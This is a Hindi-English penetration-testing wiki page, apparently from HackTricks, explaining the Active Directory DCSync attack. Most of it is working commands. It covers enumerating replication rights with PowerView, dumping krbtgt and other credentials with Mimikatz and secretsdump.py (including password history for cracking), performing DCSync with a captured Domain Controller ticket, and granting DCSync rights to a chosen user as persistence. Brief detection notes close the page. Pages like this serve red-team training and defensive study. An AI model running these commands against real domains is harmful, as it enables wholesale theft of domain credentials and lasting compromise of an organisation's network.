# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** permission का मतलब है domain पर ये permissions होना: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** और **Replicating Directory Changes In Filtered Set**।

**DCSync के बारे में महत्वपूर्ण नोट्स:**

- **DCSync attack एक Domain Controller के व्यवहार को simulate करता है और अन्य Domain Controllers से Directory Replication Service Remote Protocol (MS-DRSR) का उपयोग करके information replicate करने को कहता है**। क्योंकि MS-DRSR, Active Directory का एक valid और आवश्यक function है, इसलिए इसे turn off या disable नहीं किया जा सकता।
- By default केवल **Domain Admins, Enterprise Admins, Administrators, और Domain Controllers** groups के पास required privileges होते हैं।
- In practice, **full DCSync** को domain naming context पर **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** चाहिए। **`DS-Replication-Get-Changes-In-Filtered-Set`** अक्सर इनके साथ delegate किया जाता है, लेकिन अकेले यह **confidential / RODC-filtered attributes** (उदाहरण के लिए legacy LAPS-style secrets) को sync करने के लिए ज़्यादा relevant है, न कि full krbtgt dump के लिए।
- अगर किसी account passwords को reversible encryption के साथ store किया गया है, तो Mimikatz में password को clear text में return करने का option उपलब्ध है

### Enumeration

Check who has these permissions using `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
यदि आप DCSync अधिकारों वाले **non-default principals** पर ध्यान केंद्रित करना चाहते हैं, तो built-in replication-capable groups को filter out करें और केवल unexpected trustees की समीक्षा करें:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### लोकली Exploit करें
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### दूरस्थ रूप से Exploit करें
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
व्यावहारिक scoped उदाहरण:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### कैप्चर किए गए DC machine TGT (ccache) का उपयोग करके DCSync

unconstrained-delegation export-mode scenarios में, आप एक Domain Controller machine TGT (जैसे, `DC1$@DOMAIN` for `krbtgt@DOMAIN`) कैप्चर कर सकते हैं। फिर आप उस ccache का उपयोग करके DC के रूप में authenticate कर सकते हैं और बिना password के DCSync perform कर सकते हैं।
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operational notes:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. अगर environment **SPN target name validation** enforce करता है, तो full dump `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user` के साथ fail हो सकता है.
- उस स्थिति में, पहले target DC के लिए **`cifs/<dc>`** service ticket request करें, या तुरंत ज़रूरत वाले account के लिए **`-just-dc-user`** पर fall back करें.
- जब आपके पास केवल lower replication rights हों, तब भी LDAP/DirSync-style syncing **confidential** या **RODC-filtered** attributes expose कर सकता है, उदाहरण के लिए legacy `ms-Mcs-AdmPwd`, बिना full krbtgt replication के.

`-just-dc` 3 files generate करता है:

- एक **NTLM hashes** वाली
- एक **Kerberos keys** वाली
- एक NTDS से cleartext passwords वाली, उन accounts के लिए जिनमें [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled है. आप reversible encryption वाले users इस तरह प्राप्त कर सकते हैं:

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

अगर आप domain admin हैं, तो आप `powerview` की मदद से यह permissions किसी भी user को grant कर सकते हैं:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operator `bloodyAD` के साथ यही कर सकते हैं:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
फिर, आप **जांच सकते हैं कि उपयोगकर्ता को सही तरीके से असाइन किया गया था या नहीं** उन 3 privileges को, उन्हें output में ढूंढकर (आपको "ObjectType" field के अंदर privileges के नाम दिखने चाहिए):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – एक operation किसी object पर किया गया था
- Security Event ID 5136 (Audit Policy for object must be enabled) – एक directory service object को modify किया गया था
- Security Event ID 4670 (Audit Policy for object must be enabled) – एक object पर permissions बदल दी गई थीं
- AD ACL Scanner - ACLs की create and compare create reports बनाएं और compare करें। [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
